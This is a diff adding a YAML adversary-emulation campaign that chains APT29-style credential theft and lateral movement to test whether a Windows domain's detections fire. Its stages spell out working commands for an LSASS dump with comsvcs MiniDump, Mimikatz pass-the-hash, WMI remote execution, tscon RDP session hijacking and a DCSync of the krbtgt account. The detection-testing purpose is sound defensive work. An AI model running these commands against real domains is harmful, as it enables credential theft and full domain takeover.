@@ -1,0 +1,110 @@
+api_version: v1
+kind: Campaign
+
+meta:
+  name: apt-lateral-movement
+  adversary: apt29
+  description: "APT29-style lateral movement — credential harvesting, pass-the-hash, RDP pivoting, and service account abuse across a Windows domain environment."
+  objective: "Validate detection of credential-based lateral movement techniques including PtH, RDP session hijacking, and WMI/PSRemoting execution."
+  mitre_version: "15.1"
+  severity: critical
+  tags: [apt, lateral-movement, credential-theft, pass-the-hash, rdp]
+  authors: ["ThreatEcho"]
+  created: "2024-11-05"
+  modified: "2025-06-18"
+
+variables:
+  target_host: "10.0.1.50"
+  pivot_host: "10.0.1.75"
+  domain_controller: "10.0.1.10"
+  domain: "corp.example.com"
+
+stages:
+  - id: credential-dump
+    name: LSASS Credential Dump
+    technique: T1003.001
+    tactic: credential-access
+    description: "Dump credentials from LSASS process memory using Mimikatz-equivalent technique."
+    execute:
+      type: shell
+      target: "{{target_host}}"
+      args:
+        command: "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump (Get-Process lsass).Id C:\\Temp\\lsass.dmp full"
+        executor: powershell
+        elevation: required
+    expect:
+      telemetry: [process_creation, file_write, sysmon_event_10]
+      detections: [lsass_memory_access, credential_dumping, comsvcs_minidump]
+    on_failure: continue
+
+  - id: pass-the-hash
+    name: Pass-the-Hash Lateral Movement
+    technique: T1550.002
+    tactic: lateral-movement
+    description: "Use harvested NTLM hash to authenticate to the pivot host without knowing the plaintext password."
+    depends_on: [credential-dump]
+    execute:
+      type: shell
+      target: localhost
+      args:
+        command: "sekurlsa::pth /user:svc_backup /domain:{{domain}} /ntlm:aad3b435b51404eeaad3b435b51404ee /run:powershell.exe"
+        executor: mimikatz
+        elevation: required
+    expect:
+      telemetry: [logon_event_4624, ntlm_auth, process_creation]
+      detections: [pass_the_hash_detected, anomalous_ntlm_logon, lateral_movement_indicator]
+    on_failure: continue
+
+  - id: wmi-remote-exec
+    name: WMI Remote Execution
+    technique: T1047
+    tactic: execution
+    description: "Execute commands on the pivot host using WMI with the compromised service account."
+    depends_on: [pass-the-hash]
+    execute:
+      type: shell
+      target: "{{pivot_host}}"
+      args:
+        command: "wmic /node:{{pivot_host}} /user:svc_backup process call create 'cmd.exe /c whoami > C:\\Temp\\whoami.txt'"
+        executor: cmd
+        elevation: required
+    expect:
+      telemetry: [process_creation, wmi_event, network_connection]
+      detections: [wmi_remote_execution, lateral_tool_transfer, remote_process_creation]
+    on_failure: continue
+
+  - id: rdp-session-hijack
+    name: RDP Session Hijack
+    technique: T1563.002
+    tactic: lateral-movement
+    description: "Hijack an existing RDP session on the pivot host to assume an active user's context."
+    depends_on: [wmi-remote-exec]
+    execute:
+      type: shell
+      target: "{{pivot_host}}"
+      args:
+        command: "tscon 2 /dest:console"
+        executor: cmd
+        elevation: required
+    expect:
+      telemetry: [logon_event_4778, rdp_session, process_creation]
+      detections: [rdp_session_hijack, session_takeover, tscon_abuse]
+    on_failure: continue
+
+  - id: dc-replication
+    name: DCSync Replication Attack
+    technique: T1003.006
+    tactic: credential-access
+    description: "Replicate domain credentials from the domain controller using DCSync (simulated DRS replication)."
+    depends_on: [rdp-session-hijack]
+    execute:
+      type: shell
+      target: "{{pivot_host}}"
+      args:
+        command: "lsadump::dcsync /domain:{{domain}} /user:krbtgt"
+        executor: mimikatz
+        elevation: required
+    expect:
+      telemetry: [directory_service_access_4662, replication_event, network_connection]
+      detections: [dcsync_detected, directory_replication_anomaly, krbtgt_extraction_attempt]
+    on_failure: abort
